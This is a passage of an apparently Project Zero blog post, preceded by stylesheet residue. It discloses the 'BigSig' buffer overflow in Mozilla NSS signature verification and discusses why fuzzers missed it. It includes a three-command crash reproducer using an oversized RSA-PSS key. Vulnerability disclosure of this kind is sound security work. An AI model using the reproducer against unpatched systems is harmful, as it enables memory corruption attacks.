0}.lst-kix_q4elz23jmthh-8>li{counter-increment:lst-ctn-kix_q4elz23jmthh-8}.lst-kix_q4elz23jmthh-2>li{counter-increment:lst-ctn-kix_q4elz23jmthh-2}.lst-kix_81cegzboe9ky-3>li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-1>li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-5>li:before{content:"\0025a0  "}.lst-kix_2fd9br43vo52-8>li:before{content:"\0025a0  "}.lst-kix_wy7koemfbmv1-7>li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-7>li:before{content:"\0025cb  "}.lst-kix_2gk0zovl15u8-5>li:before{content:"\0025a0  "}ul.lst-kix_2gk0zovl15u8-0{list-style-type:none}ul.lst-kix_2gk0zovl15u8-2{list-style-type:none}.lst-kix_2gk0zovl15u8-7>li:before{content:"\0025cb  "}ul.lst-kix_2gk0zovl15u8-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_2gk0zovl15u8-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-5{list-style-type:none}.lst-kix_prwgb47nvxz6-7>li:before{content:"\0025cb  "}ul.lst-kix_2gk0zovl15u8-6{list-style-type:none}ul.lst-kix_cw1yal3teuur-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-5{list-style-type:none}ul.lst-kix_cw1yal3teuur-7{list-style-type:none}ul.lst-kix_2gk0zovl15u8-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-6{list-style-type:none}ul.lst-kix_2gk0zovl15u8-7{list-style-type:none}ul.lst-kix_cw1yal3teuur-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-2.start{counter-reset:lst-ctn-kix_q4elz23jmthh-2 0}ul.lst-kix_cw1yal3teuur-0{list-style-type:none}ul.lst-kix_cw1yal3teuur-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-2{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c31{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left;height:11pt}.c13{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c19{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#009900;font-weight:400}.c34{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left}.c12{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#993333;font-weight:400}.c1{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#212529;font-weight:400}.c45{color:#333333;text-decoration:none;vertical-align:baseline;font-size:30pt;font-family:"Amatic SC"}.c7{font-size:8pt;font-family:Consolas,"Courier New";color:#333333;font-weight:400}.c4{margin-left:36pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.c14{border-spacing:0;border-collapse:collapse;margin-right:auto}.c26{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c11{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c10{font-size:8pt;font-family:Consolas,"Courier New";color:#0000ff;font-weight:400}.c40{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c24{color:#000000;font-weight:700;font-size:11pt;font-family:"Arial"}.c0{font-size:9pt;font-family:Consolas,"Courier New";color:#333333;font-weight:400}.c18{font-size:8pt;font-family:Consolas,"Courier New";color:#008080;font-weight:400}.c5{font-size:9pt;font-family:Consolas,"Courier New";color:#0000ff;font-weight:400}.c30{color:#000000;font-weight:400;font-size:10pt;font-family:"Arial"}.c42{background-color:#ffffff;font-size:8pt;color:#b1b100}.c47{font-weight:400;font-size:8pt;font-family:"Arial"}.c28{background-color:#ffffff;font-size:8pt;color:#000066}.c38{background-color:#ffffff;font-size:8pt;color:#ff0000}.c23{background-color:#ffffff;font-size:8pt;color:#339933}.c8{text-decoration:none;vertical-align:baseline;font-style:normal}.c50{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c46{text-decoration:none;vertical-align:baseline;font-style:italic}.c51{background-color:#ffffff;font-size:8pt;color:#0000dd}.c9{color:inherit;text-decoration:inherit}.c27{margin-left:36pt;padding-left:0pt}.c17{padding:0;margin:0}.c22{font-size:9pt;color:#008000}.c21{font-weight:400;font-family:Consolas,"Courier New"}.c33{orphans:2;widows:2}.c44{width:33%;height:1px}.c35{font-weight:400;font-style:italic}.c48{font-size:8pt;color:#8b0000}.c29{height:0pt}.c39{font-size:11pt}.c32{font-weight:700}.c41{font-size:10pt}.c20{vertical-align:super}.c49{height:11pt}.c36{color:#000000}.c16{page-break-after:avoid}.c37{font-size:5pt}.c43{margin-left:36pt}.c25{font-size:9pt}.title{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#000000;font-size:10pt;padding-bottom:0pt;font-family:"Arial";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c50"><div>
 <p class="c3 c33 c16 subtitle" id="h.hkm9sn4jh6p1"><span class="c30 c8">Posted by Tavis Ormandy, Project Zero</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h1 class="c13 c16" id="h.ce7bhufj5ofg"><span class="c24 c8">Introduction</span></h1>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">This is an unusual blog post. I normally write posts to highlight some hidden attack surface or interesting complex vulnerability class. This time, I want to talk about a vulnerability that is neither of those things. The striking thing about this vulnerability is just how simple it is. This should have been caught earlier, and I want to explore why that didn&rsquo;t happen.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">In 2021, all good bugs need a catchy name, so I&rsquo;m calling this one &ldquo;BigSig&rdquo;.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">First, let&rsquo;s take a look at the bug, I&rsquo;ll explain how I found it and then try to understand why we missed it for so long.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h1 class="c13 c16" id="h.7ttrpxxbs2f9"><span class="c24 c8">Analysis</span></h1>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c26"><a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Overview">Network Security Services</a></span><span>&nbsp;(NSS) is Mozilla&#39;s widely used, cross-platform cryptography library. </span><span>When you verify an ASN.1 encoded digital signature</span><span>, NSS will create a </span><span class="c26 c21"><a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#120">VFYContext</a></span><span class="c11 c8">&nbsp;structure to store the necessary data. This includes things like the public key, the hash algorithm, and the signature itself.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><a id="t.9a4d5980e1b13f527ae3eec9673b5d4e7a7010ba"></a><a id="t.0"></a><table class="c14"><tbody><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3"><span class="c10">struct</span><span class="c7">&nbsp;</span><span class="c18">VFYContextStr</span><span class="c7 c8">&nbsp;{</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c18">SECOidTag</span><span class="c7">&nbsp;hashAlg; </span><span class="c21 c48">/* the hash algorithm */</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c18">SECKEYPublicKey</span><span class="c7 c8">&nbsp;*key;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">union</span><span class="c7 c8">&nbsp;{</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">char</span><span class="c7 c8">&nbsp;buffer[1];</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">char</span><span class="c7 c8">&nbsp;dsasig[DSA_MAX_SIGNATURE_LEN];</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">char</span><span class="c7 c8">&nbsp;ecdsasig[2 * MAX_ECKEY_LEN];</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">char</span><span class="c7 c8">&nbsp;rsasig[(RSA_MAX_MODULUS_BITS + 7) / 8];</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp;} u;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">int</span><span class="c7 c8">&nbsp;pkcs1RSADigestInfoLen;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">unsigned</span><span class="c7">&nbsp;</span><span class="c10">char</span><span class="c7 c8">&nbsp;*pkcs1RSADigestInfo;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">void</span><span class="c7 c8">&nbsp;*wincx;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">void</span><span class="c7 c8">&nbsp;*hashcx;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c10">const</span><span class="c7">&nbsp;</span><span class="c18">SECHashObject</span><span class="c7">&nbsp;*</span><span class="c7">hashobj</span><span class="c7 c8">;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c18">SECOidTag</span><span class="c7">&nbsp;encAlg; &nbsp; &nbsp;</span><span class="c21 c48">/* enc alg */</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c18">PRBool</span><span class="c7 c8">&nbsp;hasSignature;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp;</span><span class="c18">SECItem</span><span class="c7 c8">&nbsp;*params;</span></p>
 <p class="c34"><span class="c7">};</span></p></td></tr><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3 c16 c33 subtitle" id="h.scw51sqnutu4"><span class="c32">Fig 1</span><span>. The </span><span class="c21">VFYContext</span><span class="c30 c8">&nbsp;structure from NSS.</span></p></td></tr></tbody></table>
 <p class="c13"><span><br>The maximum size signature that this structure can handle is whatever the largest union member is, in this case that&rsquo;s RSA at </span><span class="c26"><a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/freebl/blapit.h#139">2048 bytes</a></span><span>.</span><span class="c11 c8">&nbsp;That&rsquo;s 16384 bits, large enough to accommodate signatures from even the most ridiculously oversized keys.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">Okay, but what happens if you just....make a signature that&rsquo;s bigger than that?</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">Well, it turns out the answer is memory corruption. Yes, really.</span></p>
 <p class="c13"><span class="c11 c8"><br>The untrusted signature is simply copied into this fixed-sized buffer, overwriting adjacent members with arbitrary attacker-controlled data.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">The bug is simple to reproduce and affects multiple algorithms. The easiest to demonstrate is RSA-PSS. In fact, just these three commands work:</span></p>
 <p class="c2"><span class="c11 c8"></span></p><a id="t.488dd1b55b75f3df66e36d7bc8b67538aa8c4fd3"></a><a id="t.1"></a><table class="c14"><tbody><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3"><span class="c5"># We need 16384 bits to fill the buffer, then 32 + 64 + 64 + 64 bits to overflow to </span><span class="c5">hashobj</span><span class="c5 c8">, </span></p>
 <p class="c3"><span class="c5 c8"># which contains function pointers (bigger would work too, but takes longer to generate).</span></p>
 <p class="c3"><span class="c21 c25">$ openssl </span><span class="c21 c25">genpkey</span><span class="c21 c25">&nbsp;-algorithm rsa-pss -pkeyopt rsa_keygen_bits:$((16384 + 32 + 64 + 64 + 64)) -pkeyopt rsa_keygen_primes:5 -out </span><span class="c21 c25">bigsig.key</span></p>
 <p class="c3"><span class="c5 c8"># Generate a self-signed certificate from that key</span></p>
 <p class="c3"><span class="c8 c21 c36 c25">$ openssl req -x509 -new -key bigsig.key -subj &quot;/CN=BigSig&quot; -sha256 -out bigsig.cer</span></p>
 <p class="c3"><span class="c5 c8"># Verify it with NSS...</span></p>
 <p class="c3"><span class="c21 c25">$ </span><span class="c21 c25">vfychain</span><span class="c8 c21 c36 c25">&nbsp;-a bigsig.cer </span></p>
 <p class="c3"><span class="c8 c21 c25 c36">Segmentation fault</span></p></td></tr><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3 c33 c16 subtitle" id="h.48dytsqrxb61"><span class="c32">Fig 2</span><span class="c30 c8">. Reproducing the BigSig vulnerability in three easy commands.</span></p></td></tr></tbody></table>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>The actual code that does the corruption varies based on the algorithm; </span><span class="c26"><a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#477">here is the code</a></span><span>&nbsp;for RSA-PSS. The bug is that there is simply no bounds checking at all; </span><span class="c21">sig</span><span>&nbsp;and </span><span class="c21">key</span><span>&nbsp;are &nbsp;arbitrary-length, attacker-controlled blobs, and </span><span class="c21">cx-&gt;u</span><span class="c11 c8">&nbsp;is a fixed-size buffer.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><a id="t.5f5007590f34efd7a404c6d3f020f980f0b97070"></a><a id="t.2"></a><table class="c14"><tbody><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">case</span><span class="c7">&nbsp;</span><span class="c7">rsaPssKey</span><span class="c7 c8">:</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sigLen = SECKEY_SignatureLen(key);</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">if</span><span class="c7 c8">&nbsp;(sigLen == 0) {</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c21 c48">/* error set by SECKEY_SignatureLen */</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rv = SECFailure;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">break</span><span class="c7 c8">;</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</span></p>
 <p class="c31"><span class="c7 c8"></span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">if</span><span class="c7 c8">&nbsp;(sig-&gt;len != sigLen) {</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PORT_SetError(SEC_ERROR_BAD_SIGNATURE);</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rv = SECFailure;</span></p>
 <p class="c3"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">break</span><span class="c7 c8">;</span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</span></p>
 <p class="c31"><span class="c7 c8"></span></p>
 <p class="c3"><span class="c7 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PORT_Memcpy(cx-&gt;u.buffer, sig-&gt;data, sigLen);</span></p>
 <p class="c34"><span class="c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c10">break</span><span class="c7">;</span></p></td></tr><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3 c33 c16 subtitle" id="h.b383i7m17o2u"><span class="c32">Fig 3</span><span>. The signature size must match the size of the key, but there are no other limitations. </span><span class="c21">cx-&gt;u</span><span>&nbsp;is a fixed-size buffer, and </span><span class="c21">sig</span><span class="c30 c8">&nbsp;is an arbitrary-length, attacker-controlled blob.</span></p></td></tr></tbody></table>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">I think this vulnerability raises a few immediate questions:</span></p>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_2fd9br43vo52-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Was this a recent code change or regression that hadn&rsquo;t been around long enough to be discovered? </span><span class="c32">No</span><span>, the original code was </span><span class="c26"><a class="c91" href="https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l158">checked in</a></span><span>&nbsp;with ECC support on the 17th October 2003, but wasn&#39;t exploitable until some </span><span class="c26"><a class="c91" href="https://hg.mozilla.org/projects/nss/diff/10393/security/nss/lib/cryptohi/seckey.c#l1.63">refactoring</a></span><span>&nbsp;in June 2012. In 2017, RSA-PSS support was </span><span class="c26"><a class="c91" href="https://hg.mozilla.org/projects/nss/rev/84e886ea090e36c69df58a71665a97bd25c62d02">added</a></span><span class="c11 c8">&nbsp;and made the same error.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_81cegzboe9ky-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Does this bug require a long time to generate a key that triggers the bug? </span><span class="c32">No</span><span>, the example above generates a real key and signature, but it can just be garbage as the overflow happens before the signature check. A few kilobytes of </span><span class="c21">A</span><span>&rsquo;s works just fine.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_2gk0zovl15u8-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Does reaching the vulnerable code require some complicated state that fuzzers and static analyzers would have difficulty synthesizing, like hashes or checksums? </span><span class="c32">No</span><span>, it has to </span><span>be well-formed</span><span class="c11 c8">&nbsp;DER, that&rsquo;s about it.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_z8xtsan2wa5s-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Is this an uncommon code path? </span><span class="c32">No</span><span>, Firefox does not use this code path for RSA-PSS signatures, but the default entrypoint for certificate verification in NSS, </span><span class="c21">CERT_VerifyCertificate(),</span><span class="c11 c8">&nbsp;is vulnerable.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_oetzaqvyxxoa-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Is it specific to the RSA-PSS algorithm? </span><span class="c32">No</span><span class="c11 c8">, it also affects DSA signatures.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_prwgb47nvxz6-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Is it unexploitable, or otherwise limited impact? </span><span class="c32">No</span><span>, the </span><span class="c21">hashobj</span><span class="c21">&nbsp;</span><span>member can be clobbered. That object contains </span><span class="c26"><a class="c91" href="https://searchfox.org/mozilla-central/rev/41a8c58186206985c0d70d3d460c04ac844d11d0/security/nss/lib/util/hasht.h#45">function pointers</a></span><span>,</span><span>&nbsp;which are used immediately.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c32">This wasn&rsquo;t a process failure, the vendor did everything right</span><span>. Mozilla has a mature, world-class security team. They pioneered </span><span class="c26"><a class="c91" href="https://www.mozilla.org/en-US/security/bug-bounty/">bug bounties</a></span><span>,</span><span>&nbsp;</span><span>invest</span><span>&nbsp;in </span><span class="c26"><a class="c91" href="https://research.mozilla.org/rust/">memory safety</a></span><span>, fuzzing and </span><span class="c26"><a class="c91" href="https://coverage.moz.tools/">test coverage</a></span><span class="c11 c8">.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>NSS was one of the very first projects included with </span><span class="c26"><a class="c91" href="https://google.github.io/oss-fuzz/">oss-fuzz</a></span><span>, it was officially supported since at least </span><span class="c26"><a class="c91" href="https://github.com/google/oss-fuzz/commit/3d325bf20f0b09961b6c7de34aa4da0d16cfa67d">October 2014</a></span><span>. Mozilla also fuzz NSS themselves with </span><span class="c26"><a class="c91" href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a></span><span>, and have contributed their own </span><span class="c26"><a class="c91" href="https://searchfox.org/mozilla-central/source/security/nss/fuzz/asn1_mutators.cc">mutator</a></span><span>&nbsp;collection and distilled </span><span class="c26"><a class="c91" href="https://github.com/mozilla/nss-fuzzing-corpus">coverage corpus</a></span><span>. There is an extensive testsuite, and nightly </span><span class="c26"><a class="c91" href="https://firefox-source-docs.mozilla.org/tools/sanitizer/asan.html">ASAN</a></span><span>&nbsp;builds.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>I&#39;m generally skeptical of static analysis, but this seems like a simple missing bounds check that should be easy to find. Coverity has been monitoring NSS since at least </span><span class="c26"><a class="c91" href="https://scan.coverity.com/projects/nss">December 2008</a></span><span>, and also </span><span>appears</span><span class="c11 c8">&nbsp;to have failed to discover this.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>Until 2015, Google Chrome </span><span class="c26"><a class="c91" href="https://chromium.googlesource.com/chromium/third_party/nss/+/refs/heads/master/README.chromium">used</a></span><span>&nbsp;NSS, and maintained their own testsuite and fuzzing infrastructure independent of Mozilla. Today, Chrome platforms use </span><span class="c26"><a class="c91" href="https://boringssl.googlesource.com/boringssl/">BoringSSL</a></span><span class="c11 c8">, but the NSS port is still maintained.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_ohd9cwgi2ci1-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Did Mozilla have good test coverage for the vulnerable areas? </span><span class="c26"><a class="c91" href="https://coverage.moz.tools/#revision=latest&path=security%2Fnss%2Flib%2Fcryptohi%2Fsecvfy.c&suite=gtest&view=file&line=201">YES</a></span><span class="c11 c8">.</span></li><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Did Mozilla/chrome/oss-fuzz have relevant inputs in their fuzz corpus? </span><span class="c26"><a class="c91" href="https://storage.googleapis.com/oss-fuzz-coverage/nss/reports/20211027/linux/src/nss/lib/cryptohi/secvfy.c.html#L201">YES</a></span><span class="c11 c8">.</span></li><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Is there a mutator capable of extending </span><span>ASN1_ITEM</span><span>s? </span><span class="c26"><a class="c91" href="https://codereview.chromium.org/1677803002/patch/180001/190008">YES</a></span><span>.</span></li><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Is this an </span><span class="c26"><a class="c91" href="https://github.com/google/sanitizers/wiki/AddressSanitizerIntraObjectOverflow">intra-object overflow</a></span><span>, or other form of corruption that ASAN would have difficulty detecting? NO, it&#39;s a textbook buffer overflow that ASAN can easily detect.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><h1 class="c13 c16" id="h.rdx8pm6yen5"><span class="c24 c8">How did I find the bug?</span></h1>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">I&#39;ve been experimenting with alternative methods for measuring code coverage, to see if any have any practical use in fuzzing. The fuzzer that discovered this vulnerability used a combination of two approaches, stack coverage and object isolation.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h2 class="c13 c16" id="h.j6f1q7cn6h69"><span class="c24 c8">Stack Coverage</span></h2>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>The most common method of measuring code coverage is block coverage, or </span><span class="c26"><a class="c91" href="https://clang.llvm.org/docs/SanitizerCoverage.html#edge-coverage">edge coverage</a></span><span>&nbsp;when source code is available. I&rsquo;ve been curious if that is always sufficient. For example, consider a simple dispatch table with a combination of trusted and untrusted parameters, as in </span><span class="c32">Fig 4</span><span class="c11 c8">.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><a id="t.bd548b01b21e1cf0cdd7eaa859aff19f6d0661e5"></a><a id="t.3"></a><table class="c14"><tbody><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3"><span class="c23 c21">#include &lt;stdio.h&gt;</span></p>
 <p class="c3"><span class="c23 c21">#include &lt;string.h&gt;</span></p>
 <p class="c3"><span class="c23 c21">#include &lt;limits.h&gt;</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c12">static</span><span class="c1">&nbsp;</span><span class="c12">char</span><span class="c1">&nbsp;buf</span><span class="c19">[</span><span class="c21 c51">128</span><span class="c19">]</span><span class="c23 c21">;</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c12">void</span><span class="c1">&nbsp;cmd_handler_foo</span><span class="c19">(</span><span class="c12">int</span><span class="c1">&nbsp;a</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">size_t</span><span class="c1">&nbsp;b</span><span class="c19">)</span><span class="c1">&nbsp;</span><span class="c19">{</span><span class="c1">&nbsp;</span><span class="c28 c21">memset</span><span class="c19">(</span><span class="c1">buf</span><span class="c23 c21">,</span><span class="c1">&nbsp;a</span><span class="c23 c21">,</span><span class="c1">&nbsp;b</span><span class="c19">)</span><span class="c23 c21">;</span><span class="c1">&nbsp;</span><span class="c19">}</span></p>
 <p class="c3"><span class="c12">void</span><span class="c1">&nbsp;cmd_handler_bar</span><span class="c19">(</span><span class="c12">int</span><span class="c1">&nbsp;a</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">size_t</span><span class="c1">&nbsp;b</span><span class="c19">)</span><span class="c1">&nbsp;</span><span class="c19">{</span><span class="c1">&nbsp;cmd_handler_foo</span><span class="c19">(</span><span class="c21 c38">&#39;A&#39;</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">sizeof</span><span class="c1">&nbsp;buf</span><span class="c19">)</span><span class="c23 c21">;</span><span class="c1">&nbsp;</span><span class="c19">}</span></p>
